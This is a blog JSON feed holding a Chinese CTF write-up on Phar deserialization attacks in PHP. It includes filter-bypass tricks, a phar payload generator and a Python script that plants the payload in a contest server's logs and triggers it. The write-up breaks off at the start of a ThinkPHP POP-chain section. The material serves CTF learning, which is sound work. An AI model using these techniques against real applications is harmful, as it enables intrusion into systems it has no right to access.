{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cubic Y³ • All posts by \"php\" tag",
    "description": "Notes, CTF, DIY, thoughts and waifus.\n\nI'm CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.\nLearning: Electric guitar\n❤❤❤ CTF, toy projects, anime\n✖✖✖ Technological supremacy\nResume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&target=resume.tex&command=xelatex).",
    "home_page_url": "http://cubicy.icu",
    "items": [
        {
            "id": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "url": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "title": "浅谈Phar反序列化漏洞利用：N1CTF 2021 easyphp & 安洵杯2021 EZ_TP",
            "date_published": "2021-11-28T05:35:00.000Z",
            "content_html": "<h1 id=\"Phar\"><a href=\"#Phar\" class=\"headerlink\" title=\"Phar\"></a>Phar</h1><h2 id=\"什么是Phar\"><a href=\"#什么是Phar\" class=\"headerlink\" title=\"什么是Phar\"></a>什么是Phar</h2><blockquote>\n<p>PHp ARchive, like a Java JAR, but for PHP.</p>\n</blockquote>\n<p>phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。</p>\n<blockquote>\n<p>phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p>\n</blockquote>\n<p>说白了，就是一种压缩文件，但是不止能放压缩文件进去。</p>\n<p>在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p>\n<p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phar.readonly = 0</span><br></pre></td></tr></table></figure>\n\n<p>即可。</p>\n<hr>\n<h2 id=\"Phar文件格式\"><a href=\"#Phar文件格式\" class=\"headerlink\" title=\"Phar文件格式\"></a>Phar文件格式</h2><p>Phar文件由四部分组成：</p>\n<p><strong>1.stub</strong></p>\n<p>stub是phar文件的文件头，格式为<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>，xxxxxx可以是任意字符，包括留空，且php闭合符与最后一个分号之间不能有多于一个的空格符。另外php闭合符也可省略。</p>\n<p><strong>2.manifest describing the contents</strong></p>\n<p>该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png\" loading=\"lazy\"></p>\n<p>这里面的metadata以serialize形式储存，为反序列化漏洞埋下了伏笔。</p>\n<p><strong>3.file contents</strong></p>\n<p>被压缩的用户添加的文件内容</p>\n<p>4.<strong>signature</strong></p>\n<p>可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL.</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png\" alt=\"signature\" loading=\"lazy\"></p>\n<p>这部分以<code>GBMB</code>（47 42 4d 42）结尾。</p>\n<p>需要注意，stub不一定要在文件开头。</p>\n<h2 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h2><p>在2018 Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>\n<blockquote>\n<p>利用phar文件会以序列化的形式存储用户自定义的<strong>meta-data</strong>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，<strong>可以不依赖unserialize()直接进行反序列化操作</strong>。</p>\n</blockquote>\n<p>也就是说，如果我们能控制传入以下函数的参数，就有潜在的phar反序列化漏洞利用可能：</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png\" loading=\"lazy\"></p>\n<p>还有一些别的函数可用，可参考这篇：<a href=\"https://www.freebuf.com/articles/web/205943.html\">https://www.freebuf.com/articles/web/205943.html</a></p>\n<p><strong>试试看？</strong></p>\n<p>我们先来生成一个phar：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); <span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//设置stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">TestObject</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//将自定义的meta-data存入manifest</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\">    <span class=\"comment\">//签名自动计算</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意这边$o反序列化只会保存数据不会保存方法。执行完毕后，我们来观察phar文件的内容：</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png\" loading=\"lazy\"></p>\n<p>GBMB结尾的签名以及序列化后的metadata清晰可见。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Destruct called&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class=\"comment\">//既然是压缩文件，我们可以如此访问其中的某个文件</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$filename</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。</p>\n<p>PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）</p>\n<hr>\n<h2 id=\"phar-是什么\"><a href=\"#phar-是什么\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;是什么\"></a><strong>phar:&#x2F;&#x2F;是什么</strong></h2><p>前面提到，我们解析phar文件常常使用phar:&#x2F;&#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&#x2F;&#x2F;需要文件绝对路径，phar:&#x2F;&#x2F;并不需要。（来源请求）</p>\n<hr>\n<h2 id=\"小tricks\"><a href=\"#小tricks\" class=\"headerlink\" title=\"小tricks\"></a><strong>小tricks</strong></h2><h3 id=\"绕过前缀过滤\"><a href=\"#绕过前缀过滤\" class=\"headerlink\" title=\"绕过前缀过滤\"></a>绕过前缀过滤</h3><p>队里师傅的几个example可以类比使用，都是在前缀非phar:&#x2F;&#x2F;的情况下调用了phar:&#x2F;&#x2F;</p>\n<p>compress.bzip2和compress.zlib</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$z</span>);</span><br></pre></td></tr></table></figure>\n\n<p>php:&#x2F;&#x2F; </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"简单的绕过\"><a href=\"#简单的绕过\" class=\"headerlink\" title=\"简单的绕过\"></a>简单的绕过</h3><p>我们可以利用stub部分前缀任意的特性：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> -&gt; <span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;GIF89a&#x27;</span>.<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class=\"comment\">//设置 stub，增加 gif 文件头</span></span><br></pre></td></tr></table></figure>\n\n<p>这可以绕过一部分对文件头的检测。</p>\n<hr>\n<h3 id=\"绕过前后脏数据\"><a href=\"#绕过前后脏数据\" class=\"headerlink\" title=\"绕过前后脏数据\"></a>绕过前后脏数据</h3><p>由于签名部分的存在，php会校验文件哈希值，并检查末尾是否为GBMB，如下是解析部分的源码：</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png\" loading=\"lazy\"></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p>可见，如果末尾不是GBMB会直接导致解析失败。</p>\n<p>在CTF中利用该漏洞需要我们完成写入&#x2F;上传phar，并调用文件包含函数。我们知道一句话木马由于有<code>&lt;?php ?&gt;</code>这样的头尾标识存在，可以无视前后脏数据；然而对于phar，这样的骚操作被签名部分阻止了。有办法绕过吗？请参阅：<a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>利用convertToExecutable函数，我们可以把phar文件转为其他格式的phar文件，例如.tar和.zip格式。</p>\n<p>我们以N1CTF easyphp为例子，这题允许我们写入日志，并且可以利用phar反序列化得到flag，难点在于日志文件前后有额外脏数据，会使得我们的phar文件无法被解析。</p>\n<p>然而如果以tar格式储存phar，末尾的脏数据并不会影响解析（这是tar的格式决定的），而开头的脏数据可以在制造phar文件时就提前构造好（这样这部分数据也会被纳入签名计算），写入日志时不必写入这部分，而是令其与脏数据拼接形成合法的phar。exploit如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t\tCLASS FLAG &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;FLAG: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;_flag;</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$sb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sb&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ts</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ts&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;.phar&quot;</span>); <span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\">    **<span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>); <span class=\"comment\">//会生成*.phar.tar**</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;Time: &quot;</span>.<span class=\"variable\">$ts</span>.<span class=\"string\">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;], CONTENT: [&quot;</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\">    <span class=\"comment\">//tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//设置stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">FLAG</span>();</span><br><span class=\"line\">\t\t<span class=\"variable\">$o</span> -&gt; data = <span class=\"string\">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//将自定义的meta-data存入manifest</span></span><br><span class=\"line\">    <span class=\"comment\">//签名自动计算</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>把这个跑在本地web服务上，然后写个脚本（当时半夜赶制的很丑会留下一些垃圾文件 求轻喷 队里师傅写的干净多了）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> rq</span><br><span class=\"line\"><span class=\"keyword\">import</span> json </span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">ip = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_random_str</span>(<span class=\"params\">randomlength=<span class=\"number\">16</span></span>):</span><br><span class=\"line\">  <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">  生成一个指定长度的随机字符串</span></span><br><span class=\"line\"><span class=\"string\">  &quot;&quot;&quot;</span></span><br><span class=\"line\">  random_str = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  base_str = <span class=\"string\">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\">  length = <span class=\"built_in\">len</span>(base_str) - <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(randomlength):</span><br><span class=\"line\">    random_str += base_str[random.randint(<span class=\"number\">0</span>, length)]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> random_str</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_one</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    rd = generate_random_str(<span class=\"number\">4</span>)</span><br><span class=\"line\">    ts2 = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class=\"line\">    ts = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class=\"line\">    res = rq.get(url=<span class=\"string\">f&quot;http://127.0.0.1/test.php?sb=<span class=\"subst\">&#123;rd&#125;</span>&amp;ts=<span class=\"subst\">&#123;ts2&#125;</span>&quot;</span>)  <span class=\"comment\"># 访问本地生成phar</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f: </span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    data = data[<span class=\"number\">70</span>::]<span class=\"comment\">#去掉前面的冗余部分以便和log前面拼接形成合法*.phar.tar</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form&#x27;</span>&#125;  <span class=\"comment\"># 源文本</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class=\"subst\">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class=\"comment\"># 写入日志</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class=\"subst\">&#123;ip&#125;</span>/<span class=\"subst\">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class=\"comment\"># 反序列化</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(res.text)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">30</span>,<span class=\"number\">30</span>):<span class=\"comment\">#考虑本地和远程的时间差异，这边设置个30s的窗口期</span></span><br><span class=\"line\">    new_one(i)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;生成的文件长这样（看个开头就行）</span></span><br><span class=\"line\"><span class=\"string\">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class=\"line\"><span class=\"string\">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class=\"line\"><span class=\"string\">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class=\"line\"><span class=\"string\">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class=\"line\"><span class=\"string\">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class=\"line\"><span class=\"string\">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class=\"line\"><span class=\"string\">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class=\"line\"><span class=\"string\">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class=\"line\"><span class=\"string\">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>不只是tar，还有别的格式：</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png\" loading=\"lazy\"><br><a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>对应的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">BZ2</span>);<span class=\"comment\">//会生成xxxx.phar.tar.bz2</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);<span class=\"comment\">//会生成xxxx.phar.tar.gz</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">ZIP</span>);<span class=\"comment\">//会生成xxxx.phar.zip</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"POP链\"><a href=\"#POP链\" class=\"headerlink\" title=\"POP链\"></a><strong>POP链</strong></h3><p>POP(property oriented programming)，说白了就是经过一连串的魔术方法&#x2F;特殊方法调用达到特定目的的一种攻击方式，本质是通过在调用这些方法的过程中又触发了别的特殊方法，引发连锁反应直到触及目标。phar反序列化使得不存在unserilize函数时这样的攻击也能成功，这正是所谓“扩大攻击面”。我们以刚刚结束的安洵杯2021 EZ_TP为例子。</p>\n<p>网站使用ThinkPHP V5.1.37，网上已有现成的<a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">POP链</a>，现在需要我们在没有unserilize函数的情况下完成反序列化攻击。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 